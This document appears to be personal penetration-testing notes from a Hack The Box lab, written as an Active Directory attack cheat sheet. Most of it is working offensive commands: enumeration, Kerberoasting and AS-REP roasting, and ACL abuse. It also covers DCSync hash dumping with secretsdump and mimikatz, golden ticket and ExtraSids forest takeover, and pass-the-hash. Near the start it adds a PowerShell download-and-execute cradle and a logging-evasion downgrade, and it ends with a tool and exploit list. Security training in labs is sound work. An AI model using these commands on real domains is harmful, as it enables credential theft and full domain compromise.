GET A LIST OF ALL USERS : `Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName | Out-File "C:\user_list.txt"`

enum an acc : `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof`
#### Basic Enumeration Commands


|**Command**|**Result**|
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|

#### Harnessing Powershell

| **Description**                                                                                                                                                                                                                               | **Cmd-Let**                                                                                                                |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| Lists available modules loaded for use.                                                                                                                                                                                                       | `Get-Module`                                                                                                               |
| Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         | `Get-ExecutionPolicy -List`                                                                                                |
| This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. | `Set-ExecutionPolicy Bypass -Scope Process`                                                                                |
| Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                | `Get-ChildItem Env: \| ft Key,Value`                                                                                       |
| With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       | `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 |
| This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        | `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` |

We can evade logging by downgrading the PowerShell 
```powershell
powershell.exe -version 2
```

We can check protections using 
```powershell
Get-MpComputerStatus
```

#### Network Information

| **Networking Commands**              | **Description**                                                                                                  |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Lists all known hosts stored in the arp table.                                                                   |
| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |
#### Quick WMI checks

|**Command**|**Description**|
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patch level and description of the Hotfixes applied|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information to include any attributes within the list|
|`wmic process list /format:list`|A listing of all processes on host|
|`wmic ntdomain list /format:list`|Displays information about the Domain and Domain Controllers|
|`wmic useraccount list /format:list`|Displays information about all local accounts and any domain accounts that have logged into the device|
|`wmic group list /format:list`|Information about all local groups|
|`wmic sysaccount list /format:list`|Dumps information about any system accounts that are being used as service accounts.|
#### Table of Useful Net Commands

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |


![[UAC-values.png]]

Find your ACLs

```powershell

Import-Module powerview

Find-InterestingDomainAcl

```

Append to .kirbi to feed it to hashcat

```BASH

sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

```

Easier way lol

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```




ACLs


    ForceChangePassword abused with Set-DomainUserPassword
    Add Members abused with Add-DomainGroupMember
    GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
    GenericWrite abused with Set-DomainObject
    WriteOwner abused with Set-DomainObjectOwner
    WriteDACL abused with Add-DomainObjectACL
    AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
    Addself abused with Add-DomainGroupMember

![[ACL_attacks_graphic.webp]]
From SPN to user

```Powershell

Get-ADUser -Filter {ServicePrincipalName -like "*<SPN>*"} -Properties ServicePrincipalName | Select-Object Name, SamAccountName, ServicePrincipalName

```


Export all Krbtgt tickets to CSV file 

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

Perform DCSync attack : 
DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes

The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.
![[adnunn_right_dcsync.webp]]

Using Get-DomainUser to View $USER's Group Membership

```powershell
PS C:\htb> Get-DomainUser -Identity $USER  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

samaccountname     : adunn
"objectsid"          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

```

#sid
PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account. We first get the user's SID in the above command and then check all ACLs set on the domain object (`"DC=inlanefreight,DC=local"`) using [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user `adunn` (denoted in the below command as `$sid`) possesses these rights. The command confirms that the user does indeed have the rights.

```powershell
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All
```

Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py

#DCSync

```shell
ADNSecurity@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can be used [`lsadump::dcsync`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync) to operate a DCSync and recover the `krbtgt` keys for a [golden ticket attack](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden) for example. For this attack to work, the following mimikatz command should run in an elevated context (i.e. through runas with plaintext password, [pass-the-hash](https://www.thehacker.recipes/ad/movement/ntlm/pth) or [pass-the-ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt)).

```powershell

# Extract a specific user, in this case the krbtgt
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt

# Dump everything (printed in a short and readable format)
lsadump::dcsync /dc:172.16.5.5 /domain:INLANEFREIGHT.LOCAL /all /csv
```

```
set type=all
_ldap._tcp.dc._msdcs.INLANEFREIGHT
```

We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:

- Number and % of passwords cracked
- top 10 passwords
- Password length metrics
- Password re-use


#### Enumerating the Remote Desktop Users Group


```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN

```

Ayy, here's your commandz for that Kerberos Double Hop problem, comrade:

PSCredential Object (Workaround #1) 🛠️:
```powershell

$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $SecPassword)
get-domainuser -spn -credential $Cred | select samaccountname
```

    What it does: Creates a PSCredential object with your creds, then sends them with every command you run. 🔑

Register-PSSessionConfiguration (Workaround #2) 🎫:

    Register a new session with your creds:

Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential DOMAIN\username

    Restart the WinRM service:

Restart-Service WinRM

    Reconnect with the new session:

Enter-PSSession -ComputerName TARGET_HOST -Credential DOMAIN\username -ConfigurationName backupadmsess

    What it does: Makes the system recognize your creds on the remote machine, like giving you a VIP pass. 🎟️

Key Points to Remember:

    TGT + TGS = the Kerberos power combo. 💥
    Without TGT: You hit a wall (Double Hop).
    With tricks: You’re bypassing the wall. 🏃‍♂️💨

### **GPO (Group Policy Objects) Misconfigurations**

**TL;DR**: GPOs are like the "rules" in a school — but if they’re set wrong, it’s like giving the entire class the power to change the rules whenever. 😬

1. **What's happening?**  
    Admins use GPOs to control security settings across computers and users in the domain. But if the wrong people have access to these GPOs, they could change settings like adding themselves to the "admin" list on computers. 😱
    
2. **The Command**:  
    To see what GPOs exist:

```powershell
Get-DomainGPO | select displayname
```

**What you’re looking for**:  
GPOs like "AutoLogon" or "Block Removable Media" might give hints of weak settings.  
Example:

```text
DisplayName
-----------
AutoLogon
```

**Exploit the Misconfig**:  
If you find that your user group can change a GPO, like "Domain Users" or something, you can hijack that GPO and make yourself an admin on _all_ the machines it applies to. 😈  
Example command:

```powershell
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

**What You Should Do in Practice:**

- **Step 1**: Find out if any users are set up with weak Kerberos settings by running `GetNPUsers.py` and looking for vulnerable users.
- **Step 2**: Once you find one, crack their Kerberos ticket and get the password. 🎯
- **Step 3**: Look at GPOs with `Get-DomainGPO` and check if you can manipulate any settings. If you can, hijack the GPO and **boom**, local admin on a bunch of machines. 💥

---

**Why It’s OP**:

Once you’re in, you can escalate your privileges or control multiple computers at once, making your attack a **domino effect**. Think of it like hacking the mainframe, then getting into every single connected system. 💻🔥



**how to find password less users ?**
``` powershell
Get-NetUser | Where-Object {($_.UserAccountControl -band 0x0020) -ne 0} | Select-Object 
SamAccountName
```

**Find Users with "Do Not Require Kerberos Pre-Authentication" Enabled**

The **"Do not require Kerberos pre-authentication"** setting is controlled by the `UF_DONT_REQUIRE_PREAUTH` flag in the `UserAccountControl` attribute.

To find users with this setting enabled:
```powershell
Get-NetUser | Where-Object {($_.UserAccountControl -band 0x40000) -ne 0} | Select-Object SamAccountName

```

how to find #asrep roastable & dump hashes
```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users | grep '\$'
```


### #trust exploiting domain trust relationships

---

**1. Enumerate Trusts with PowerShell**

- **Get all domain trusts**:
    
    ```powershell
    Get-ADTrust -Filter *
    ```
    
- **Enumerate trusts using PowerView**:
    
    ```powershell
    Get-DomainTrust
    ```
    
- **Show domain users from a trusted domain**:
    
    ```powershell
    Get-DomainUser -Domain TARGET.DOMAIN.LOCAL | select SamAccountName
    ```
    

---

#### **2. BloodHound - Visualize Domain Trusts**

- **Mapping domain trusts with BloodHound**:
    
    ```powershell
    Get-DomainTrustMapping
    ```
    

---

#### **3. Find Domain Controllers (DCs) with Netdom**

- **Query domain controllers**:
    
    ```powershell
    netdom query /domain:DOMAIN.LOCAL dc
    ```
    

---

#### **4. Domain Trust Analysis (Netdom)**

- **Query domain trust relationships**:
    
    ```powershell
    netdom query /domain:DOMAIN.LOCAL trust
    ```
    

---

#### **5. Kerberos Attack (Kerberoast)**

- **Find service accounts to Kerberoast** (if applicable):
    
    ```powershell
    Get-DomainUser -Domain TARGET.DOMAIN.LOCAL | where {$_.ServiceAccount -eq $true}
    ```
    
- **Request TGT for service account** (Kerberos TGT brute force):
    
    ```bash
    Rubeus.exe tgtdeleg /user:USER /rc4:HASH
    ```
    

---

#### **6. Attack via Low Privilege Users (Pass-the-Hash)**

- **Pass-the-Hash** attack using NTLM hashes:
    
    ```bash
    psexec.py DOMAIN/USER:HASH@TARGET-IP
    ```
    

---

#### **7. Trust Configuration Check**

- **Check trust direction** (Bidirectional or One-Way):
    - **`BiDirectional`** allows mutual access between domains.
    - **`One-Way`** means access is limited to one domain.

---

#### **8. Look for Weak Domain Trusts**

- **Check for External Trusts** (weakly configured):
    - External trusts are often less secured and easier to exploit.

---

#### **9. Pivot and Escalate**

- **Enumerate and escalate privileges** using found admin accounts, service accounts, or via **Kerberos Ticket Extraction**:
    - Extract TGTs (Ticket-Granting Tickets) and crack hashes to gain access.

---

#### **Attack Path Overview**

1. **Enumerate domain trusts** using `Get-ADTrust` or `Get-DomainTrust`.
2. **Check trust direction** (Bidirectional is more exploitable).
3. **Find privileged accounts** in trusted domains (`Get-DomainUser`).
4. **Kerberoast** or **Pass-the-Hash** low-privilege service accounts.
5. **Find domain controllers** using `netdom query dc`.
6. **Exploit trust relationships** and escalate privileges across domains.

---

#### **Tools to Remember:**

- **PowerView** (for domain enumeration)
- **BloodHound** (for trust visualization)
- **Netdom** (for trust and DC queries)
- **Rubeus** (for Kerberos attacks)
- **Mimikatz / Pth** (for NTLM hashes)

---

Keep this handy, and you’ll be able to map out domain trust relationships and identify attack vectors quickly! 😎

#extrasids
### ExtraSids Attack Cheat Sheet

**Overview:**

- The **ExtraSids** attack allows for compromising a parent domain after a child domain is compromised. By exploiting the `sidHistory` attribute (which lacks SID Filtering), a user in a child domain with this attribute set to the parent domain’s **Enterprise Admins group** SID gains admin access to the entire forest.

### Prerequisites:

- **KRBTGT hash** for the child domain.
- **SID for the child domain**.
- **FQDN** of the child domain.
- **SID for the Enterprise Admins group** in the parent domain.
- **Target user** in the child domain (doesn't need to exist).

### Key Steps:

#### 1. **Gather Required Data**:

- **KRBTGT hash** (from DCSync attack):
    
    ```
    mimikatz> lsadump::dcsync /user:<domain>\krbtgt
    ```
    
- **Child Domain SID** (via PowerView or Mimikatz):
    
    ```
    Get-DomainSID
    ```
    
- **Enterprise Admins SID** (from PowerView or AD tools):
    
    ```
    Get-DomainGroup -Domain <parent-domain> -Identity "Enterprise Admins"
    ```
    
- **FQDN of the child domain**:
    
    ```
    Get-DomainTrust
    ```
    

#### 2. **Create Golden Ticket** with Mimikatz:

Use the gathered data to create a Golden Ticket:

```
mimikatz> kerberos::golden /user:hacker /domain:<child-domain> /sid:<child-SID> /krbtgt:<KRBTGT-hash> /sids:<Enterprise-Admins-SID> /ptt
```

This ticket grants access to the parent domain’s resources.

#### 3. **Verify Golden Ticket**:

- Confirm Kerberos ticket is in memory:
    
    ```
    klist
    ```
    
- Access resources:
    
    ```
    ls \\<dc-name>\c$
    ```
    

#### 4. **Alternative Tool**: **Rubeus**

Use **Rubeus** to create and inject the Golden Ticket:

```
.\Rubeus.exe golden /rc4:<KRBTGT-hash> /domain:<child-domain> /sid:<child-SID> /sids:<Enterprise-Admins-SID> /user:hacker /ptt
```

#### 5. **Post-Exploit**:

- After ticket creation, resources from the parent domain are accessible.
- The attack allows lateral movement and escalation of privileges across the forest.

### Attack Notes:

- The **KRBTGT hash** is critical for ticket creation. Always change it after compromising a domain.
- SID Filtering protection can prevent this attack but is often not enabled in many environments.



### **Domain Trust Attack Cheat Sheet (Child -> Parent)**

#### **1. Gather Information (from Child Domain)**

To perform the attack, collect the following details:

- **KRBTGT hash for the child domain**
- **SID of the child domain**
- **Target user (any valid user, even non-existent)**
- **Fully Qualified Domain Name (FQDN) of the child domain**
- **SID of the Enterprise Admins group in the parent domain**

#### **2. Dump KRBTGT Hash (using `secretsdump.py`)**

To dump the KRBTGT hash for the child domain, use the following command:

```bash
secretsdump.py <child-domain>/<user>@<child-dc-ip> -just-dc-user <child-domain>/krbtgt
```

Example:

```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

#### **3. Brute Force SID for the Child Domain (using `lookupsid.py`)**

Perform SID brute-forcing to retrieve the child domain SID and associated RIDs for users and groups:

```bash
lookupsid.py <domain>/<user>@<child-dc-ip>
```

Example:

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

**Filter for Domain SID:**

```bash
lookupsid.py <domain>/<user>@<child-dc-ip> | grep "Domain SID"
```

#### **4. Retrieve Enterprise Admin SID (from Parent Domain)**

Run `lookupsid.py` against the parent domain DC to retrieve the SID of the Enterprise Admins group:

```bash
lookupsid.py <domain>/<user>@<parent-dc-ip> | grep -B12 "Enterprise Admins"
```

Example:

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

#### **5. Construct Golden Ticket (using `ticketer.py`)**

Use `ticketer.py` to generate the Golden Ticket for the target user (e.g., `hacker`) with the gathered SIDs:

```bash
ticketer.py -nthash <KRBTGT-hash> -domain <child-domain> -domain-sid <child-domain-SID> -extra-sid <parent-domain-SID> <target-user>
```

Example:

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

This will create a `hacker.ccache` file containing the Golden Ticket.

#### **6. Set KRB5CCNAME (to use the Golden Ticket)**

Set the environment variable `KRB5CCNAME` to use the Golden Ticket file:

```bash
export KRB5CCNAME=hacker.ccache
```

#### **7. Authenticate to Parent Domain using PSEXEC (via `psexec.py`)**

Authenticate using the Golden Ticket and attempt to get a SYSTEM shell on the parent domain DC:

```bash
psexec.py <child-domain>/<target-user>@<parent-dc-fqdn> -k -no-pass -target-ip <parent-dc-ip>
```

Example:

```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

#### **8. (Optional) Automate with `raiseChild.py`**

Use `raiseChild.py` to automatically perform the entire attack (create Golden Ticket, authenticate, execute PSEXEC):

```bash
raiseChild.py -target-exec <parent-dc-ip> <child-domain>/<user>
```

Example:

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

#### **9. Extract NTLM Hash for Domain Admin**

Once you gain access to the parent domain, extract the NTLM hash for the `Domain Admin` (e.g., `bross`):

```bash
secretsdump.py <parent-domain>/<user>@<parent-dc-ip> -just-dc-user <parent-domain>/bross
```

Example:

```bash
secretsdump.py INLANEFREIGHT.LOCAL/htb-student_adm@172.16.5.5 -just-dc-user INLANEFREIGHT/bross
```

---

### **Important Notes:**

- **Be mindful of the environment**: Always understand the tools you are using, and perform attacks manually if possible for better control and understanding.
- **Golden Ticket Lifetime**: The default expiration for Golden Tickets is 10 years. You can adjust this as needed.
- **Autopwn Scripts**: While tools like `raiseChild.py` are convenient, use them cautiously in a production or sensitive environment.


```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
---
# Tools of the Trade

Many of the module sections require tools such as open-source scripts or precompiled binaries. Where applicable, these can be found in the `C:\Tools` directory on the Windows hosts provided in the sections aimed at attacking from Windows. In sections that focus on attacking AD from Linux we provide a Parrot Linux host customized for the target environment as if you were an anonymous user with an attack box within the internal network. All necessary tools and scripts will be preloaded on this host.  Here is a listing of many of the tools that we will cover in this module:


| Tool              | Description |  
| ----------------- | ----------- |  
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView) | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |  
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) database for graphical analysis of the AD environment. |  
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. |  
| [BloodHound.py](https://github.com/fox-it/BloodHound.py) |  A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and can be run from a non-domain joined attack box. The output can be ingested into the BloodHound GUI for analysis. |  
| [Kerbrute](https://github.com/ropnop/kerbrute)  | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts and perform password spraying and brute forcing. |  
| [Impacket toolkit](https://github.com/SecureAuthCorp/impacket)  |  A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory. |  
| [Responder](https://github.com/lgandx/Responder) | Responder is a purpose built tool to poison LLMNR, NBT-NS and MDNS, with many different functions. |   
| [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. |  
| [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh) | The C# version of Inveigh with with a semi-interactive console for interacting with captured data such as username and password hashes. |  
| [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.  |    
| [CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec)  | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols such as SMB, WMI, WinRM, and MSSQL. |  
| [Rubeus](https://github.com/GhostPack/Rubeus) |  Rubeus is a C# tool built for Kerberos Abuse.  |  
| [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) | Another Impacket module geared towards finding Service Principal names tied to normal users. |  
| [Hashcat](https://hashcat.net/hashcat/)           | A great hashcracking and password recovery tool. |  
| [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) | A tool for enumerating information from Windows and Samba systems. |  
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) | A rework of the original Enum4linux tool that works a bit differently. |  
| [ldapsearch](https://linux.die.net/man/1/ldapsearch) | Built in interface for interacting with the LDAP protocol. |  
| [windapsearch](https://github.com/ropnop/windapsearch) |   A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. |  
| [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray) | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. |  
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).  |  
| [smbmap](https://github.com/ShawnDEvans/smbmap) | SMB share enumeration across a domain. |  
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) | Part of the Impacket toolset, it provides us with psexec like functionality in the form of a semi-interactive shell. |  
| [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) | Part of Impacket toolset, it provides the capability of command execution over WMI. |  
| [Snaffler](https://github.com/SnaffCon/Snaffler) | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. |  
| [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. |  
| [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) | Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. |  
| [Mimikatz](https://github.com/ParrotSec/mimikatz) | Performs many functions. Noteably, pass-the-hash attacks, extracting plaintext passwords, and kerberos ticket extraction from memory on host. |  
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) | Remotely dump SAM and LSA secrets from a host. |  
| [evil-winrm](https://github.com/Hackplayers/evil-winrm) | Provides us with an interactive shell on host over the WinRM protocol. |  
| [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) | Part of Impacket toolset, it provides the ability to interact with MSSQL databases. |  
| [noPac.py](https://github.com/Ridter/noPac) | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. |  
| [rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) | Part of the Impacket toolset, RPC endpoint mapper. |  
| [CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py) | Printnightmare PoC in python. |  
| [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) | Part of the Impacket toolset, it performs SMB relay attacks. |  
| [PetitPotam.py](https://github.com/topotam/PetitPotam) | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. |  
| [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) | Tool for manipulating certificates and TGTs. |  
| [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) | This tool will use an existing TGT to request a PAC for the current user using U2U. |  
| [adidnsdump](https://github.com/dirkjanm/adidnsdump) | A tool for enumeration and dumping of DNS records from a domain. Similar to performing a DNS Zone transfer. |  
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) | Extracts usernames and passwords from Group Policy preferences. |  
